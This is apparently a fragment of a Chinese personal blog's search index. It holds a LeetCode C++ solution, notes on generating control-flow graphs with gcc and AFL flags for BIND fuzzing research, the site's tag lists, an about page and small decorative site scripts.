Note that f(x, y) is increasing with respect to both x and y. * // i.e. f(x, y) &lt; f(x + 1, y), f(x, y) &lt; f(x, y + 1) * int f(int x, int y); * }; */// 1: x+y// 2: x*y// 3：class Solution {public: vector&lt;vector&lt;int&gt;&gt; findSolution(CustomFunction&amp; customfunction, int z) { vector&lt;vector&lt;int&gt;&gt; res; int x, y; for(x = 1; x &lt;= 1000; x++) { int l = 1, r = 1001; while(l &lt;= r) { y = (r - l) / 2 + l; if(customfunction.f(x, y) == z) break; if(customfunction.f(x,y) &gt; z) r = y-1; else l = y+1; } if(customfunction.f(x,y) == z) { res.push_back({x, y}); } } return res; }}; 双指针123456789101112131415class Solution {public: vector&lt;vector&lt;int&gt;&gt; findSolution(CustomFunction&amp; customfunction, int z) { vector&lt;vector&lt;int&gt;&gt; res; int x = 1, y = 1000; for(x = 1; x &lt;= 1000; x++) { int l = 1, r = 1001; for(; y &gt; 1 &amp;&amp; customfunction.f(x, y) &gt; z; y--); if(customfunction.f(x,y) == z) { res.push_back({x, y}); } } return res; }};","link":"/home/2023/02/13/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9321/"},{"title":"CFG生成＆定位BB","text":"cfg生成 使用afl编译，添加以下参数-fdump-tree-all 12export CC='afl-gcc -fdump-tree-all'export CXX='afl-g++ -fdump-tree-all' 或使用gcc编译 12export CC='gcc -fdump-tree-all'export CXX='g++ -fdump-tree-all' 编译完成后，进入./bin/named发现生成了cfg文件 1234567891011121314151617tt@ubuntu:~/Desktop/dnsenv/bind-9.18.1/bin/named$ find *.cfgbuiltin.c.011t.cfgconfig.c.011t.cfgcontrol.c.011t.cfgcontrolconf.c.011t.cfgdlz_dlopen_driver.c.011t.cfgfuzz.c.011t.cfglog.c.011t.cfglogconf.c.011t.cfgmain.c.011t.cfgos.c.011t.cfgserver.c.011t.cfgstatschannel.c.011t.cfgtkeyconf.c.011t.cfgtransportconf.c.011t.cfgtsigconf.c.011t.cfgzoneconf.c.011t.cfg 对于gcc版本足够高的情况（我用gcc 11.3.0进行测试），在编译时加入以下参数 1-fdump-tree-all-graph 可以直接产生.dot文件（graph description language） 123456789101112131415161718root@tt-surfacepro6:~/tmp# find *.dota-test.c.015t.cfg.dota-test.c.017t.ompexp.dota-test.c.018t.warn-printf.dota-test.c.022t.fixup_cfg1.dota-test.c.023t.ssa.dota-test.c.027t.fixup_cfg2.dota-test.c.028t.local-fnsummary1.dota-test.c.029t.einline.dota-test.c.051t.release_ssa.dota-test.c.052t.local-fnsummary2.dota-test.c.092t.fixup_cfg3.dota-test.c.097t.adjust_alignment.dota-test.c.233t.veclower.dota-test.c.234t.cplxlower0.dota-test.c.236t.switchlower_O0.dota-test.c.243t.isel.dota-test.c.244t.optimized.dot 使用以下命令可以将其转化成图片 1dot -Tpng &lt;文件名&gt; -O 依赖 Graphviz gcc版本较低的情况下，对控制流图可视化 可以使用gcc-python-plugin获取基于gimple的控制流 参考官方教程编译安装gcc-python-plugin 编写生成图片python的脚本 编译时使用该脚本，命令如下 12export CC='gcc -fplugin=/home/tt/Desktop/dnsenv/gcc-python-plugin/python.so -fplugin-arg-python-script=/home/tt/Desktop/dnsenv/gcc-python-plugin/examples/show-gimple.py'export CXX='g++ /home/tt/Desktop/dnsenv/gcc-python-plugin/python.so -fplugin-arg-python-script=/home/tt/Desktop/dnsenv/gcc-python-plugin/examples/show-gimple.py' 这个工具有点问题，需要简单修改一下，在修改文件gccutils/__init__.py的invoke_dot函数为如下内容 12345678910111213141516171819202122def invoke_dot(dot, name='test'): from subprocess import Popen, PIPE if 1: fmt = 'png' else: # SVG generation seems to work, but am seeing some text-width issues # with rendering of the SVG by eog and firefox on this machine (though # not chromium). # # Looks like X coordinates allocated by graphviz don't contain quite # enough space for the &lt;text&gt; elements. # # Presumably a font selection/font metrics issue fmt = 'svg' filename = '%s.%s' % (name, fmt) p = Popen(['dot', '-T%s' % fmt, '-o', filename], stdin=PIPE) p.communicate(dot.encode('utf8')) #p = Popen(['xdg-open', filename]) #p.communicate() 不过这个办法编译过程中还是出现dot崩溃等问题 使用IDA绘制 下载安装ida 编译bind 用ida对bind二进制反汇编，并可以得到其cfg 根据函数定位BB","link":"/home/2023/02/15/%E7%BB%84%E4%BC%9A/cfg%E7%94%9F%E6%88%90%EF%BC%86%E5%AE%9A%E4%BD%8DBB/"}],"tags":[{"name":"projects","slug":"projects","link":"/home/tags/projects/"},{"name":"Kotlin-Android 实习","slug":"Kotlin-Android-实习","link":"/home/tags/Kotlin-Android-%E5%AE%9E%E4%B9%A0/"},{"name":"Kotlin-Android","slug":"Kotlin-Android","link":"/home/tags/Kotlin-Android/"},{"name":"LeetCode","slug":"LeetCode","link":"/home/tags/LeetCode/"},{"name":"动态规划","slug":"动态规划","link":"/home/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"name":"LeetCode 101","slug":"LeetCode-101","link":"/home/tags/LeetCode-101/"},{"name":"PAT-(Advanced-Level)-Practice","slug":"PAT-Advanced-Level-Practice","link":"/home/tags/PAT-Advanced-Level-Practice/"},{"name":"PAT-(Basic-Level)-Practice","slug":"PAT-Basic-Level-Practice","link":"/home/tags/PAT-Basic-Level-Practice/"},{"name":"shell","slug":"shell","link":"/home/tags/shell/"},{"name":"linux","slug":"linux","link":"/home/tags/linux/"},{"name":"hexo","slug":"hexo","link":"/home/tags/hexo/"},{"name":"OS","slug":"OS","link":"/home/tags/OS/"},{"name":"fedfab","slug":"fedfab","link":"/home/tags/fedfab/"},{"name":"6.824","slug":"6-824","link":"/home/tags/6-824/"},{"name":"abac","slug":"abac","link":"/home/tags/abac/"},{"name":"组会","slug":"组会","link":"/home/tags/%E7%BB%84%E4%BC%9A/"},{"name":"fabric","slug":"fabric","link":"/home/tags/fabric/"},{"name":"BigChain DB","slug":"BigChain-DB","link":"/home/tags/BigChain-DB/"},{"name":"CoreDNS","slug":"CoreDNS","link":"/home/tags/CoreDNS/"},{"name":"QSYM","slug":"QSYM","link":"/home/tags/QSYM/"},{"name":"afl","slug":"afl","link":"/home/tags/afl/"},{"name":"geth","slug":"geth","link":"/home/tags/geth/"},{"name":"blockchain","slug":"blockchain","link":"/home/tags/blockchain/"},{"name":"bind","slug":"bind","link":"/home/tags/bind/"},{"name":"MOPT","slug":"MOPT","link":"/home/tags/MOPT/"},{"name":"文献阅读","slug":"文献阅读","link":"/home/tags/%E6%96%87%E7%8C%AE%E9%98%85%E8%AF%BB/"},{"name":"主机提权","slug":"主机提权","link":"/home/tags/%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/"},{"name":"域名解析服务扰乱","slug":"域名解析服务扰乱","link":"/home/tags/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E6%9C%8D%E5%8A%A1%E6%89%B0%E4%B9%B1/"}],"categories":[{"name":"Kotlin-Android","slug":"Kotlin-Android","link":"/home/categories/Kotlin-Android/"},{"name":"LeetCode","slug":"LeetCode","link":"/home/categories/LeetCode/"},{"name":"PAT-(Advanced-Level)-Practice","slug":"PAT-Advanced-Level-Practice","link":"/home/categories/PAT-Advanced-Level-Practice/"},{"name":"PAT-(Basic-Level)-Practice","slug":"PAT-Basic-Level-Practice","link":"/home/categories/PAT-Basic-Level-Practice/"},{"name":"linux","slug":"linux","link":"/home/categories/linux/"},{"name":"misc","slug":"misc","link":"/home/categories/misc/"},{"name":"OS","slug":"OS","link":"/home/categories/OS/"},{"name":"fedfab","slug":"fedfab","link":"/home/categories/fedfab/"},{"name":"组会","slug":"组会","link":"/home/categories/%E7%BB%84%E4%BC%9A/"}],"pages":[{"title":"categories","text":"","link":"/home/categories/index.html"},{"title":"","text":".text-popup { animation: textPopup 1s; user-select: none; white-space: nowrap; position: absolute; z-index: 99; } @keyframes textPopup { 0%, 100% { opacity: 0; } 5% { opacity: 1; } 100% { transform: translateY(-50px); } }","link":"/home/css/textPopup.css"},{"title":"about","text":"基本信息 项目 值 姓名 刘景天 昵称 刘喵喵 出生年月 2000/02 邮箱 jingtian.liu@foxmail.com qq 点击这里 教育经历 起始时间 结束时间 学校 专业 2018.09 2022.06 东北大学(秦皇岛) 计算机科学与技术 2022.09 2025.06(预计) 北京邮电大学 计算机技术(区块链方向) 项目信息fedml: deployment and modification to combine with Hyperledger fabric repo fabric: deployment and combination with fedml repo Yaml-Requests: read your yaml config file to generate python function repo Algorithm: notes for leetcode and other oj repo 其他信息欢迎相互学习&amp;交流!","link":"/home/about/index.html"},{"title":"","text":"function copyToClipboard(text, callBack) { navigator.clipboard.writeText(text).then( value => { // fulfillment callBack() }, reason => { // rejection alert(\"fail: \" + reason) } ) } $(document).ready(function() { $(\".copy\").click(function() { copyCode(this) }) var buttons = document.getElementsByClassName(\"button\") for (let i = 0; i < buttons.length; i++) { if (buttons[i].getAttribute(\"title\") == \"RSS\") { var url = document.baseURI + \"atom.xml\" buttons[i].href = \"javascript:;\" buttons[i].target = \"_self\" buttons[i].setAttribute('onclick', \"copyToClipboard(\\\"\" + url + \"\\\", function() { alert(\\\"copied to clipboard\\\") })\") break } } }) function copyCode(element) { if (element instanceof Element) { var elemt = element while(elemt.tagName != \"FIGURE\") { elemt = elemt.parentElement } elemt = elemt.getElementsByClassName(\"code\")[0] var text =elemt.innerText copyToClipboard(text, function() { var node = $(element.childNodes[0]) node.attr('class', \"fa fa-check\") setTimeout(function () { node.attr('class', \"fas fa-copy\") } ,1000) }) } } function fadeOutAndIn(node, onShow, onHide) { node.fadeOut(200, function() { onHide() node.fadeIn(200, function () { onShow() }) }) }","link":"/home/js/clickClipBoard.js"},{"title":"","text":"(function fairyDustCursor() { var possibleColors = [\"#D61C59\", \"#E7D84B\", \"#1B8798\"] var width = window.innerWidth; var height = window.innerHeight; var cursor = { x: width / 2, y: width / 2 }; var particles = []; function init() { bindEvents(); loop(); } // Bind events that are needed function bindEvents() { document.addEventListener('mousemove', onMouseMove); document.addEventListener('touchmove', onTouchMove); document.addEventListener('touchstart', onTouchMove); window.addEventListener('resize', onWindowResize); } function onWindowResize(e) { width = window.innerWidth; height = window.innerHeight; } function onTouchMove(e) { if (e.touches.length > 0) { for (var i = 0; i < e.touches.length; i++) { addParticle(e.touches[i].clientX, e.touches[i].clientY, possibleColors[Math.floor(Math.random() * possibleColors.length)]); } } } function onMouseMove(e) { cursor.x = e.clientX; cursor.y = e.clientY; addParticle(cursor.x, cursor.y, possibleColors[Math.floor(Math.random() * possibleColors.length)]); } function addParticle(x, y, color) { var particle = new Particle(); particle.init(x, y, color); particles.push(particle); } function updateParticles() { for (var i = 0; i < particles.length; i++) { particles[i].update(); } for (var i = particles.length - 1; i >= 0; i--) { if (particles[i].lifeSpan < 0) { particles[i].die(); particles.splice(i, 1); } } } function loop() { requestAnimationFrame(loop); updateParticles(); } function Particle() { this.character = \"*\"; this.lifeSpan = 120; //ms this.initialStyles = { \"position\": \"fixed\", \"top\": \"0\", //必须加 \"display\": \"block\", \"pointerEvents\": \"none\", \"z-index\": \"10000000\", \"fontSize\": \"20px\", \"will-change\": \"transform\" }; this.init = function (x, y, color) { this.velocity = { x: (Math.random() < 0.5 ? -1 : 1) * (Math.random() / 2), y: 1 }; this.position = { x: x - 10, y: y - 20 }; this.initialStyles.color = color; // console.log(color); this.element = document.createElement('span'); this.element.innerHTML = this.character; applyProperties(this.element, this.initialStyles); this.update(); document.body.appendChild(this.element); }; this.update = function () { this.position.x += this.velocity.x; this.position.y += this.velocity.y; this.lifeSpan--; this.element.style.transform = \"translate3d(\" + this.position.x + \"px,\" + this.position.y + \"px,0) scale(\" + (this.lifeSpan / 120) + \")\"; } this.die = function () { this.element.parentNode.removeChild(this.element); } } function applyProperties(target, properties) { for (var key in properties) { target.style[key] = properties[key]; } } init(); })();","link":"/home/js/fairyDustCursor.js"},{"title":"","text":"var colors = new Array(\"#FF0000\",\"#FF7F00\",\" #FFFF00\",\"#00FF00\",\"#00FFFF\",\"#0000FF\",\"#8B00FF\",\"#FF0000\",\"#FF7F00\",\" #FFFF00\",\"#00FF00\",\"#00FFFF\",\"#0000FF\",\"#8B00FF\"); var fnTextPopup = function (arr, options) { // arr参数是必须的 if (!arr || !arr.length) { return; } // 主逻辑 var index = 0; document.documentElement.addEventListener('click', function (event) { var x = event.pageX, y = event.pageY; var eleText = document.createElement('span'); eleText.className = 'text-popup'; this.appendChild(eleText); if (arr[index]) { eleText.innerHTML = arr[index]; } else { index = 0; eleText.innerHTML = arr[0]; } // 动画结束后删除自己 eleText.addEventListener('animationend', function () { eleText.parentNode.removeChild(eleText); }); // 位置 eleText.style.left = (x - eleText.clientWidth / 2) + 'px'; eleText.style.top = (y - eleText.clientHeight) + 'px'; //设置颜色 eleText.style.color = colors[index%14] // index递增 index++; }); }; fnTextPopup(['富强', '民主', '文明', '和谐', '自由', '平等', '公正', '法治', '爱国', '敬业', '诚信', '友善']);","link":"/home/js/textPopup.js"},{"title":"search","text":"","link":"/home/search/index.html"}]}